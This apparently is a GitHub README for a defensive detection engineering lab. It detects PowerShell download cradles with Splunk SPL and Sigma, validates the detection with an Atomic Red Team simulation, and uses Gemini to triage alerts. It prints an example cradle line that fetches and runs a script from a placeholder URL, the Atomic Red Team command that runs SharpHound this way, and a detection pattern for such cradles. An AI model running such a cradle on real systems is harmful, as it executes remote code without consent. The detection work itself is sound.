# Detection Engineering Validation Platform

A detection engineering project where I built one detection from scratch, tested it against a real attack simulation, found real bugs, fixed them, and added an AI layer to help decide if an alert is worth an analyst's time.

Note on naming: I already have another repo called "detection engineering lab" which covers a purple team exercise using encoded PowerShell commands. This is a separate, unrelated project — different technique, different detection logic, different goal — so I gave it its own name to avoid confusion.

---

## 1. Project Overview

The idea behind this project: instead of running an attack and then figuring out how to detect it, I wrote the detection first, based on a hypothesis, and only then ran the attack to see if my detection actually caught it.

I picked one technique — PowerShell download cradles (T1059.001) — and took it all the way through: hypothesis, detection rule, attack simulation, validation, debugging real problems, and an AI layer that decides if an alert is a real threat or noise.

I originally planned to cover more techniques but decided to go deep on one instead of doing several halfway. One technique done properly, with real bugs found and fixed, felt more useful than six done shallow.

---

## 2. Architecture

```
Atomic Red Team (runs the attack on Windows)
        |
        v
   Sysmon (logs the process creation)
        |
        v
Splunk Universal Forwarder (sends logs to Splunk)
        |
        v
   Splunk Enterprise (runs my detection search)
        |
        v
Splunk Alert (checks every 5 minutes)
        |
        v
   Webhook --> my FastAPI service (port 8002)
        |
        v
   Gemini AI (real threat or false positive?)
        |
        v
   Result shown in splunk dashboard
```

<img width="1372" height="894" alt="2" src="https://github.com/user-attachments/assets/e58c6cca-9ca4-4766-b282-4d13a0bf2a53" />

---

## 3. Detection Methodology

Order I followed:

1. Write down what I expect the attack's command line to look like (hypothesis)
2. Write the detection rule based on that hypothesis, before running anything
3. Run the actual attack
4. Check if the detection caught it
5. If not, find out why and fix it
6. Run it again to confirm

This order matters — it means the detection wasn't reverse-engineered from logs I already had. I predicted the pattern first, then tested it.

---

## 4. MITRE ATT&CK Technique

**Technique:** T1059.001 — Command and Scripting Interpreter: PowerShell

**Specific pattern:** a "download cradle" — PowerShell downloads a script from the internet and runs it directly in memory, without saving anything to disk:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://some-url/script.ps1')
```

Attackers like this because there's no file for antivirus to scan.

---

## 5. Detection Logic (Sigma + SPL)

I wrote the same detection logic two ways:

**SPL (Splunk):**
```spl
index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=1
Image="*powershell.exe"
(_raw="*DownloadString*" OR _raw="*DownloadFile*" OR _raw="*IEX*" OR _raw="*Invoke-Expression*")
(_raw="*WebClient*" OR _raw="*Webclient*")
```

**Sigma (portable, works outside Splunk too):**
File: `detections/initial_access_execution/powershell_abuse.yml`

Here's is the query :

<img width="1553" height="784" alt="qury5" src="https://github.com/user-attachments/assets/ed4d1449-a509-49fa-a990-37d2081b95de" />

---

## 6. Atomic Red Team Simulation

I used Atomic Red Team to actually run the attack instead of just describing it:

```powershell
Invoke-AtomicTest T1059.001 -TestNumbers 3 -PathToAtomicsFolder "C:\AtomicRedTeam\atomics"
```

This test downloads and runs SharpHound (a real AD enumeration tool) using the download cradle pattern. It doesn't fully succeed in my lab because my machine isn't domain-joined, but that's fine — I only needed the PowerShell process to spawn with that specific command line, and it did.

<img width="984" height="939" alt="6" src="https://github.com/user-attachments/assets/0ee2b71b-5c5c-42cc-a31f-b156f0867bac" />

---

## 7. Telemetry & Detection Validation

After running the attack, I checked things in order, not all at once:

1. **Was the event successfully ingested into Splunk?** Checked directly on the Windows host.
2. **Did the event reach Splunk?** Confirmed it actually arrived — forwarding can silently fail, so I didn't assume.
3. **Did my detection query catch it?** Ran the SPL search and confirmed it matched the right event.

<img width="1553" height="784" alt="7" src="https://github.com/user-attachments/assets/91f267c3-4e4c-4619-a58d-0fef5cfff17a" />

---

## 8. AI False-Positive Suppression

When Splunk detects something, it sends the alert to my FastAPI service through a webhook. That service sends the alert to Gemini for false-positive assessment: is this alert a real threat, or noise?

The AI gives a verdict, a confidence score, and a reason — not just yes/no. A real response I got:

```
Verdict: Likely True Positive
Confidence: 75
Reasoning: The alert triggered on a PowerShell download cradle pattern,
which is strongly associated with remote payload retrieval and execution.
Although this is a non-domain-joined personal lab machine where testing
may occur, download cradles are high-risk indicators of potential
compromise. Without command-line details confirming benign use, the
alert must be treated as a likely true positive.
```

<img width="1358" height="896" alt="8" src="https://github.com/user-attachments/assets/86b9508b-a24a-41e5-b48f-8110ccfd351e" />

---

## 9. Engineering Challenges & Fixes

These were real problems I ran into, not planned demo material.

**Problem 1 — the detection silently returned zero results**
My SPL matched on the `CommandLine` field and got nothing back, even though I could see the attack pattern clearly when I opened the raw event manually. Turned out Atomic Red Team wraps this specific payload in a multi-line PowerShell script block, and Splunk's field extraction was quietly cutting off the end of long command lines — right where `IEX`/`DownloadString` sat. The full text was still there in the raw event, just not in the extracted field.

**Fix:** matched against `_raw` instead of `CommandLine`. Worked immediately.

**Problem 2 — webhook kept failing with a 422 error**
Every time Splunk sent an alert to my API, it got rejected. Splunk doesn't send a flat JSON object — it wraps the actual fields inside a `result` object along with its own metadata like search ID and search name. My API expected a flat structure and rejected anything else.

**Fix:** wrote a normalization function that accepts either Splunk's wrapped format or a plain flat format, and fills in defaults for anything missing instead of failing.

**Problem 3 — Gemini API kept timing out / returning server errors**
This one wasn't my bug — Google's API genuinely returned a `503` once and timed out completely on another run. It ended up proving something useful though: my retry logic (3 attempts, exponential backoff) kicked in as designed, and when retries ran out, the system fell back gracefully instead of crashing — it returned the raw alert with an "AI unavailable" flag so the analyst still gets something.

<img width="1358" height="896" alt="9" src="https://github.com/user-attachments/assets/dfeb1992-9bc5-431b-9f4e-2c6412a08eb4" />

---

## 10. Metrics & Dashboard

Every alert that goes through the pipeline gets logged with:
- Detection latency
- AI response time
- AI verdict and confidence
- Whether it was a duplicate (suppressed) or a fresh alert

Logged to `metrics/detection_metrics.csv`.

<img width="1358" height="896" alt="10" src="https://github.com/user-attachments/assets/cbae1ca4-cf03-4587-be45-5b39a22c2fa9" />


I also built a small Splunk dashboard with two panels — total detection count and a detection timeline. Small, but it's real data from real runs.

<img width="1568" height="775" alt="dash1" src="https://github.com/user-attachments/assets/e2411d4f-d3f3-423d-97d3-99fbd61e7700" />

<img width="1568" height="754" alt="dash2" src="https://github.com/user-attachments/assets/e1fd12c7-1367-4b55-8530-d7612fc53393" />


---

## 11. Results

- Detection correctly caught the attack across multiple test runs
- Detection stayed quiet when there was no matching activity (confirmed with a clean 0-result search before running the attack)
- Full pipeline — Splunk to webhook to AI to metrics — worked automatically end-to-end at least once, without me manually triggering anything
- AI gave a correct, reasoned verdict when it responded successfully
- Retry and fallback logic both got tested for real, because the AI API genuinely failed twice during testing, not because I simulated a failure
- Detection hypothesis was validated successfully using Atomic Red Team simulation.

---

## 12. Limitations

Being upfront about what this doesn't include:

- Only one technique went through the full lifecycle. I planned more but chose depth over breadth.
- No false-negative testing — I didn't try an evasive variant to see if it slips past the detection.
- No real false-positive tuning pass — this is a single-user lab machine, so there wasn't genuine competing "normal" activity to tune against.
- In the automated Splunk-to-webhook path, `technique_id` sometimes shows up as "UNKNOWN" instead of the real ID. I know why (a field isn't surviving into the webhook payload) but haven't fixed it yet.
- No Persistence or Credential Access techniques were built, even though they were in the original plan.

---

## 13. Future Improvements

- Add additional MITRE ATT&CK techniques
- Expand the dashboard with coverage metrics
- Add false-negative testing
- Perform false-positive tuning
- Fix the technique_id UNKNOWN issue
- Add webhook authentication

---

## 14. References

* MITRE ATT&CK. *T1059.001 – Command and Scripting Interpreter: PowerShell.* [https://attack.mitre.org/techniques/T1059/001/](https://attack.mitre.org/techniques/T1059/001/)
* Red Canary. *Atomic Red Team.* [https://github.com/redcanaryco/atomic-red-team](https://github.com/redcanaryco/atomic-red-team)
* Red Canary. *Invoke-AtomicRedTeam.* [https://github.com/redcanaryco/invoke-atomicredteam](https://github.com/redcanaryco/invoke-atomicredteam)
* SigmaHQ. *Sigma Rule Specification.* [https://sigmahq.io/](https://sigmahq.io/)
* Splunk Documentation. [https://docs.splunk.com/](https://docs.splunk.com/)
* Sysinternals. *Sysmon.* [https://learn.microsoft.com/sysinternals/downloads/sysmon](https://learn.microsoft.com/sysinternals/downloads/sysmon)
* FastAPI Documentation. [https://fastapi.tiangolo.com/](https://fastapi.tiangolo.com/)
* Google AI. *Gemini API Documentation.* [https://ai.google.dev/](https://ai.google.dev/)

   
